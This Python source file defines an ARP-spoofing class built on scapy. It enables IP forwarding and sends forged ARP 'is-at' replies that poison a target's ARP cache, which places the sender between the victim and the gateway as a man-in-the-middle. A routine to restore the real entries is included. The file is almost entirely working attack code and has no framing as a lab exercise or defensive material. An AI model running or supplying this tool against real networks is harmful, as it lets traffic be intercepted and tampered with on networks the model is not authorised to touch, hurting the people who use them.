from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send


class ARP_SPOOFING:
    def __init__(self,destination):
        self.destination = destination

    def enable_route(self):
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                return
        with open(file_path, "w") as f:
            print(1, file=f)

    def get_mac(self,ip = None):
        if ip == None:
            ip = self.destination
        """
        Returns MAC address of any device connected to the network
        If ip is down, returns None instead
        """
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src


    def spoof(self,target, host_ip, verbose=True):
        """
        Spoofs `target_ip` saying that we are `host_ip`.
        it is accomplished by changing the ARP cache of the target (poisoning)
        """
        # get the mac address of the target
        target_mac = self.get_mac(target)
        # craft the arp 'is-at' operation packet, in other words; an ARP response
        # we don't specify 'hwsrc' (source MAC address)
        # because by default, 'hwsrc' is the real MAC address of the sender (ours)
        arp_response = ARP(pdst=self.destination, hwdst=target_mac, psrc=host_ip, op='is-at')
        # send the packet
        # verbose = 0 means that we send the packet without printing any thing
        send(arp_response, verbose=0)
        if verbose:
            # get the MAC address of the default interface we are using
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target, host_ip, self_mac))


    def restore(self, target ,host_ip, verbose=True):
        """
        Restores the normal process of a regular network
        This is done by sending the original informations
        (real IP and MAC of `host_ip` ) to `target_ip`
        """
        # get the real MAC address of target
        target_mac = self.get_mac(target)
        # get the real MAC address of spoofed (gateway, i.e router)
        host_mac = self.get_mac(host_ip)
        # crafting the restoring packet
        arp_response = ARP(pdst=target, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
        # sending the restoring packet
        # to restore the network to its normal process
        # we send each reply seven times for a good measure (count=7)
        send(arp_response, verbose=0, count=7)
        if verbose:
            print("[+] Sent to {} : {} is-at {}".format(target, host_ip, host_mac))